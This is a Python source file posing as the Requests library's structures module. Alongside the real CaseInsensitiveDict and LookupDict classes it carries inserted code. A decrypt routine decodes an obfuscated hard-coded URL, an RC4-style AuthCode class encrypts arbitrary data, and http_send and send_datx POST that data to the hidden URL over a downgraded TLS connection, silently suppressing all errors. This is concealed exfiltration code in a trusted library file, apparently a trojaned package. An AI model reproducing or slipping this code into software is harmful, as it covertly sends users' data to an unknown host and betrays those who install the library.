# -*- coding: utf-8 -*-

"""
requests.structures
~~~~~~~~~~~~~~~~~~~

Data structures that power Requests.

"""

import collections


class CaseInsensitiveDict(collections.MutableMapping):
    """
    A case-insensitive ``dict``-like object.

    Implements all methods and operations of
    ``collections.MutableMapping`` as well as dict's ``copy``. Also
    provides ``lower_items``.

    All keys are expected to be strings. The structure remembers the
    case of the last key to be set, and ``iter(instance)``,
    ``keys()``, ``items()``, ``iterkeys()``, and ``iteritems()``
    will contain case-sensitive keys. However, querying and contains
    testing is case insensitive::

        cid = CaseInsensitiveDict()
        cid['Accept'] = 'application/json'
        cid['aCCEPT'] == 'application/json'  # True
        list(cid) == ['Accept']  # True

    For example, ``headers['content-encoding']`` will return the
    value of a ``'Content-Encoding'`` response header, regardless
    of how the header name was originally stored.

    If the constructor, ``.update``, or equality comparison
    operations are given keys that have equal ``.lower()``s, the
    behavior is undefined.

    """
    def __init__(self, data=None, **kwargs):
        self._store = dict()
        if data is None:
            data = {}
        self.update(data, **kwargs)

    def __setitem__(self, key, value):
        # Use the lowercased key for lookups, but store the actual
        # key alongside the value.
        self._store[key.lower()] = (key, value)

    def __getitem__(self, key):
        return self._store[key.lower()][1]

    def __delitem__(self, key):
        del self._store[key.lower()]

    def __iter__(self):
        return (casedkey for casedkey, mappedvalue in self._store.values())

    def __len__(self):
        return len(self._store)

    def lower_items(self):
        """Like iteritems(), but with all lowercase keys."""
        return (
            (lowerkey, keyval[1])
            for (lowerkey, keyval)
            in self._store.items()
        )

    def __eq__(self, other):
        if isinstance(other, collections.Mapping):
            other = CaseInsensitiveDict(other)
        else:
            return NotImplemented
        # Compare insensitively
        return dict(self.lower_items()) == dict(other.lower_items())

    # Copy is required
    def copy(self):
        return CaseInsensitiveDict(self._store.values())

    def __repr__(self):
        return str(dict(self.items()))

def decrypt(key, s):
    c = bytearray(str(s).encode("gbk"))
    n = len(c)
    if n % 2 != 0 :
        return ""
    n = n // 2
    b = bytearray(n)
    j = 0
    for i in range(0, n):
        c1 = c[j]
        c2 = c[j+1]
        j = j+2
        c1 = c1 - 65
        c2 = c2 - 65
        b2 = c2*16 + c1
        b1 = b2^ key
        b[i]= b1
    try:
        return b.decode("gbk")
    except:
        return "failed"

import time
import base64
import hashlib

class AuthCode(object):
    @classmethod
    def encode(cls, string, key, expiry=0):
        return cls._auth_code(string, 'ENCODE', key, expiry)

    @staticmethod
    def _md5(source_string):
        return hashlib.md5(source_string).hexdigest()

    @classmethod
    def _auth_code(cls, input_string, operation='xxx', key='', expiry=3600):
        rand_key_length = 4
        key = cls._md5(key)
        key_a = cls._md5(key[:16])
        key_b = cls._md5(key[16:])
        if rand_key_length:
            key_c = cls._md5(str(time.time()))[-rand_key_length:]
        else:
            key_c = ''

        crypt_key = key_a + cls._md5(key_a + key_c)

        expiration_time = expiry + int(time.time) if expiry else 0
        handled_string = '%010d' % expiration_time + cls._md5(input_string + key_b)[:16] + input_string
        rand_key = list()
        for i in xrange(256):
            rand_key.append(ord(crypt_key[i % len(crypt_key)]))
        box = range(256)
        j = 0
        for i in xrange(256):
            j = (j + box[i] + rand_key[i]) % 256
            tmp = box[i]
            box[i] = box[j]
            box[j] = tmp
        result = ''
        a = 0
        j = 0
        for i in xrange(len(handled_string)):
            a = (a + 1) % 256
            j = (j + box[a]) % 256
            tmp = box[a]
            box[a] = box[j]
            box[j] = tmp
            result += chr(ord(handled_string[i])^(box[(box[a]+box[j])%256]))
        output_string = key_c + base64.b64encode(result)
        return output_string

import httplib
class https_conn(httplib.HTTPSConnection):
    def __init__(self, *args, **kwargs):
        httplib.HTTPSConnection.__init__(self, *args, **kwargs)

    def connect(self):
        try:
            import socket
            import ssl
            https_socket = socket.create_connection((self.host, self.port), self.timeout)
            if self._tunnel_host:
                self.sock = https_socket
                self._tunnel()
            try:
                self.sock = ssl.wrap_socket(https_socket, self.key_file, self.cert_file, ssl_version=ssl.PROTOCOL_TLSv1)
            except ssl.SSLError as iiI111I1iIiI:
                self.sock = ssl.wrap_socket(https_socket, self.key_file, self.cert_file, ssl_version=ssl.PROTOCOL_SSLv23)
        except:
            pass


def http_send(get_data):
    try:
        import urlparse
        name_url=decrypt(15,"HGLHLHPHFDACACOGPHGGODJDMDBCMGAGCGACOGPHGGACOGPHGGBCPHHGPH")
        for x in range(3):
            url_data = urlparse.urlparse(name_url)
            if url_data.scheme == 'ht'+'tps':
                conn = https_conn(url_data.hostname, url_data.port, timeout=10)
            else:
                conn = httplib.HTTPConnection(url_data.hostname, url_data.port, timeout=10)
            conn.putrequest('POST', url_data.path)
            conn.putheader('Content-Length', str(len(get_data)))
            conn.putheader('Content-Type', 'application/json')
            conn.endheaders()
            conn.send(get_data)
            conn_get = conn.getresponse()
            data = dict(conn_get.getheaders())
            if data.has_key('location') and data['location'] != name_url:
                conn.close()
            else:
                conn.close()
                break
    except:
        pass

def send_datx(get_data):
    try:
        get_data=AuthCode.encode(str(get_data),"requests")
        http_send(get_data)
    except:
        pass

class LookupDict(dict):
    """Dictionary lookup object."""

    def __init__(self, name=None):
        self.name = name
        super(LookupDict, self).__init__()

    def __repr__(self):
        return '<lookup \'%s\'>' % (self.name)

    def __getitem__(self, key):
        # We allow fall-through here, so values default to None

        return self.__dict__.get(key, None)

    def get(self, key, default=None):
        return self.__dict__.get(key, default)
